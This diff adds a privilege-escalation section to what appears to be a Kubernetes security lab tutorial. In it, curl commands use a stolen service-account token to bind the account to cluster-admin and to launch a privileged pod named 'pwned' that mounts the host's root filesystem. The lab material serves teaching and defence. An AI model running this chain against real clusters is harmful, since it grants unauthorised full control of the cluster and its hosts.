@@ -238,9 +238,90 @@ curl -sk \
 
 An attacker can store this token and use it for persistent access even after the original compromise vector is closed.
 
+## Privilege Escalation
+
+If the compromised service account has write permissions on RBAC resources, an attacker can escalate from read-only access to full cluster admin. The following steps demonstrate this chain.
+
+### Step 1 — Check if the current SA can create ClusterRoleBindings
+
+From inside the pod (continuing from Step 4's environment variables):
+
+```bash
+curl -s --cacert $CACERT \
+  -H "Authorization: Bearer $TOKEN" \
+  -H "Content-Type: application/json" \
+  -X POST \
+  -d '{"kind":"SelfSubjectAccessReview","apiVersion":"authorization.k8s.io/v1","spec":{"resourceAttributes":{"verb":"create","resource":"clusterrolebindings","group":"rbac.authorization.k8s.io"}}}' \
+  $APISERVER/apis/authorization.k8s.io/v1/selfsubjectaccessreviews \
+  | jq '.status.allowed'
+```
+
+If the result is `true`, escalation is possible.
+
+### Step 2 — Bind the current SA to cluster-admin
+
+```bash
+curl -s --cacert $CACERT \
+  -H "Authorization: Bearer $TOKEN" \
+  -H "Content-Type: application/json" \
+  -X POST \
+  -d '{
+    "apiVersion": "rbac.authorization.k8s.io/v1",
+    "kind": "ClusterRoleBinding",
+    "metadata": {"name": "escalation-binding"},
+    "roleRef": {"apiGroup": "rbac.authorization.k8s.io", "kind": "ClusterRole", "name": "cluster-admin"},
+    "subjects": [{"kind": "ServiceAccount", "name": "api-explorer-sa", "namespace": "default"}]
+  }' \
+  $APISERVER/apis/rbac.authorization.k8s.io/v1/clusterrolebindings
+```
+
+### Step 3 — Create a privileged pod via the API
+
+With cluster-admin, deploy a privileged pod that mounts the host filesystem:
+
+```bash
+curl -s --cacert $CACERT \
+  -H "Authorization: Bearer $TOKEN" \
+  -H "Content-Type: application/json" \
+  -X POST \
+  -d '{
+    "apiVersion": "v1",
+    "kind": "Pod",
+    "metadata": {"name": "pwned", "namespace": "default"},
+    "spec": {
+      "containers": [{
+        "name": "pwned",
+        "image": "alpine:3.19",
+        "command": ["sleep", "3600"],
+        "securityContext": {"privileged": true},
+        "volumeMounts": [{"name": "hostfs", "mountPath": "/host"}]
+      }],
+      "volumes": [{"name": "hostfs", "hostPath": {"path": "/"}}]
+    }
+  }' \
+  $APISERVER/api/v1/namespaces/default/pods
+```
+
+### Step 4 — Verify escalation
+
+```bash
+curl -s --cacert $CACERT \
+  -H "Authorization: Bearer $TOKEN" \
+  $APISERVER/api/v1/namespaces/default/pods/pwned \
+  | jq '{name: .metadata.name, phase: .status.phase, privileged: .spec.containers[0].securityContext.privileged}'
+```
+
+> **Cross-reference:** For more on ClusterRoleBinding abuse, see the [cluster-admin-binding](../cluster-admin-binding/) tutorial. For privileged container techniques, see [new-container](../new-container/).
+
+> **Note:** The `api-explorer-sa` service account deployed by this tutorial has read-only permissions, so Steps 2-3 will return `403 Forbidden`. This demonstrates the importance of checking permissions first (Step 1). In real environments, over-privileged service accounts make this escalation path viable.
+
 ## Cleanup
 
 ```bash
+# Remove escalation resources if Steps 2-3 succeeded
+kubectl delete clusterrolebinding escalation-binding 2>/dev/null || true
+kubectl delete pod pwned 2>/dev/null || true
+
 kubectl delete -f api-explorer.yaml
 ```
 
